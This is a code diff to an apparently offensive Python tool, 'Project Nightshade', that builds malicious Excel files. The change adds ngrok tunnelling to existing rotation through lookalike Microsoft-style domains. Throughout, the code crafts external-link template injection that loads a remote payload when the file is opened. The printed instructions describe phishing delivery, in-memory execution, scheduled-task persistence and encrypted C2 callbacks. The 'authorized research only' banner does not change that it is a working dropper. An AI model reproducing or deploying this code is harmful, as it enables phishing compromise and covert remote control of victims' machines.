@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Project Nightshade - Advanced Excel Dropper
+Project Nightshade - Advanced Excel Dropper with Ngrok Support
 Author: ek0ms savi0r | OPSEC Grade: Midnight
 Description:
     Creates an Excel file with OLE template injection that deploys an in-memory,
     fileless payload with persistence and encrypted C2 capabilities.
-    Modernizes the classic DDE technique with template injection and process hollowing.
+    Supports both ngrok tunneling and domain rotation for maximum flexibility.
 """
 import os
 import sys
@@ -21,14 +21,17 @@ from Crypto.Util.Padding import pad
 import argparse
 import requests
 
+# Configuration
 CONFIG = {
     'c2_server': base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21tYW5k').decode('utf-8'),
     'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     'checkin_interval': '3600',
     'persistence_method': 'scheduled_task',
     'encryption_key': 'nightshade-midnight-love-2023',
+    'use_ngrok': True,  # Set to False to force domain rotation
 }
 
+# Domain rotation for fallback
 STAGING_DOMAINS = [
     'cdn.microsoft-update.com',
     'assets-windows.net',
@@ -36,19 +39,46 @@ STAGING_DOMAINS = [
     'template-store.azurewebsites.net'
 ]
 
+def get_ngrok_tunnel_url():
+    """Get the current ngrok tunnel URL from the staging server"""
+    try:
+        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
+        tunnels = response.json()['tunnels']
+        for tunnel in tunnels:
+            if tunnel['proto'] == 'https':
+                return tunnel['public_url']
+        return None
+    except:
+        return None
+
 def get_current_domain():
-    """Rotate through available domains for OPSEC - matches staging server logic"""
+    """Rotate through available domains for OPSEC"""
     current_time = int(time.time())
     domain_index = current_time % len(STAGING_DOMAINS)
     return STAGING_DOMAINS[domain_index]
 
 def create_remote_template_injection():
-    """Create the external link that points to our staging server"""
+    """Create the external link that points to our staging server using domain rotation"""
     current_domain = get_current_domain()
     
     external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
     <externalBook name="https://{current_domain}/template.ole" r:id="rId1"/>
+</externalLink>'''
+    
+    return external_link
+
+def create_ngrok_template_injection():
+    """Create external link pointing to ngrok tunnel"""
+    ngrok_url = get_ngrok_tunnel_url()
+    
+    if not ngrok_url:
+        print("[!] Ngrok tunnel not available, falling back to domain rotation")
+        return create_remote_template_injection()
+    
+    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <externalBook name="{ngrok_url}/template.ole" r:id="rId1"/>
 </externalLink>'''
     
     return external_link
@@ -260,7 +290,14 @@ def create_malicious_excel(output_file):
         with open(os.path.join(tmpdir, 'xl/_rels/workbook.xml.rels'), 'w') as f:
             f.write(workbook_rels)
 
-        external_link = create_remote_template_injection()
+        if CONFIG['use_ngrok']:
+            external_link = create_ngrok_template_injection()
+            template_source = "ngrok tunnel"
+            template_url = get_ngrok_tunnel_url() or "Unknown (using fallback)"
+        else:
+            external_link = create_remote_template_injection()
+            template_source = "domain rotation"
+            template_url = f"https://{get_current_domain()}/template.ole"
         
         os.makedirs(os.path.join(tmpdir, 'xl/externalLinks'), exist_ok=True)
         with open(os.path.join(tmpdir, 'xl/externalLinks/externalLink1.xml'), 'w') as f:
@@ -302,12 +339,11 @@ def create_malicious_excel(output_file):
                     arcname = os.path.relpath(file_path, tmpdir)
                     zipf.write(file_path, arcname)
         
-        current_domain = get_current_domain()
         print(f"[+] Created advanced Excel dropper: {output_file}")
         print(f"[+] Payload encrypted with key: {CONFIG['encryption_key']}")
         print(f"[+] C2 Server: {CONFIG['c2_server']}")
-        print(f"[+] Staging Domain: {current_domain}")
-        print(f"[+] Template URL: https://{current_domain}/template.ole")
+        print(f"[+] Template Source: {template_source}")
+        print(f"[+] Template URL: {template_url}")
 
 def main():
     """Main function"""
@@ -317,6 +353,7 @@ def main():
     parser.add_argument('--c2', help='C2 server URL')
     parser.add_argument('--key', help='Encryption key')
     parser.add_argument('--domain', help='Specific staging domain to use')
+    parser.add_argument('--no-ngrok', action='store_true', help='Disable ngrok and use domain rotation')
     
     args = parser.parse_args()
     
@@ -325,9 +362,10 @@ def main():
     if args.key:
         CONFIG['encryption_key'] = args.key
     if args.domain:
-        # Override domain rotation with specific domain
         global STAGING_DOMAINS
         STAGING_DOMAINS = [args.domain]
+    if args.no_ngrok:
+        CONFIG['use_ngrok'] = False
     
     print('''
     ╔══════════════════════════════════════════════════════════╗
@@ -339,21 +377,32 @@ def main():
     
     print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
     print("[!] This tool creates malicious documents for penetration testing")
+
+    if CONFIG['use_ngrok']:
+        ngrok_url = get_ngrok_tunnel_url()
+        if ngrok_url:
+            print(f"[+] Ngrok tunnel detected: {ngrok_url}")
+        else:
+            print("[!] Ngrok tunnel not found - falling back to domain rotation")
     
     try:
         create_malicious_excel(args.output)
         print("\n[+] Delivery Instructions:")
         print("    1. Deliver the Excel file via phishing campaign")
-        print("    2. When opened, it will attempt to load remote template from staging server")
+        print("    2. When opened, it will attempt to load remote template")
         print("    3. Staging server validates User-Agent (Excel only)")
         print("    4. Template executes encrypted in-memory payload")
         print("    5. Payload establishes persistence and C2 connection")
-        print("    6. Domain rotation active for OPSEC")
+        
+        if CONFIG['use_ngrok']:
+            print("    6. Using ngrok tunneling for infrastructure-less deployment")
+        else:
+            print("    6. Using domain rotation for OPSEC")
         
     except Exception as e:
         print(f"[-] Error: {e}")
         print("[-] Ensure all dependencies are installed")
-        print("[-] pip install pycryptodome")
+        print("[-] pip install pycryptodome requests")
 
 if __name__ == "__main__":
     main()
